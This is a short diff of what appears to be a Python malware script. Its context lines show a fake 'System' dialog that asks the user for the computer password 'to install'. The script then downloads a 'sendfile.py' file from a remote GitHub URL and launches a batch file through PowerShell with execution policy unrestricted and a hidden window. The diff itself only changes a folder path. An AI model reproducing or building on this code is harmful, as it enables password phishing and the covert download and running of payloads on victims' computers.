@@ -40,7 +40,7 @@ ROOT.withdraw()
 USER_INP = simpledialog.askstring(title="System",
                                   prompt="Enter computer password to install...")
 
-d = os.path.join(os.environ["HOMEPATH"], r"C:\Program Files")
+d = os.path.join(os.environ["HOMEPATH"], r"C:\Desktop")
 
 os.chdir(d)
 
@@ -61,6 +61,7 @@ remote_url = 'https://raw.githubusercontent.com/Mood56467/889671/main/sendfile'
 local_file = 'sendfile.py'
 
 request.urlretrieve(remote_url, local_file)
+
 
 p = subprocess.Popen('powershell.exe -executionpolicy unrestricted Start-Process -WindowStyle Hidden -File "bumper5.bat"', stdout=sys.stdout)
 p.communicate()
